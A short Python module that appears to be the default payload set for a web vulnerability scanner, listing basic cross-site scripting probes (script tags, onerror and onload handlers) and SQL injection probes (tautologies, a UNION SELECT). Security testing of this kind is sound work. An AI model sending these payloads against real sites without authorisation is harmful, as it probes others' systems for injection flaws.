from __future__ import annotations

DEFAULTS: dict[str, list[str]] = {
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "\"><script>alert(1)</script>",
        "'\"><svg/onload=alert(1)>",
    ],
    "sqli": [
        "'",
        "1' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
    ],
}
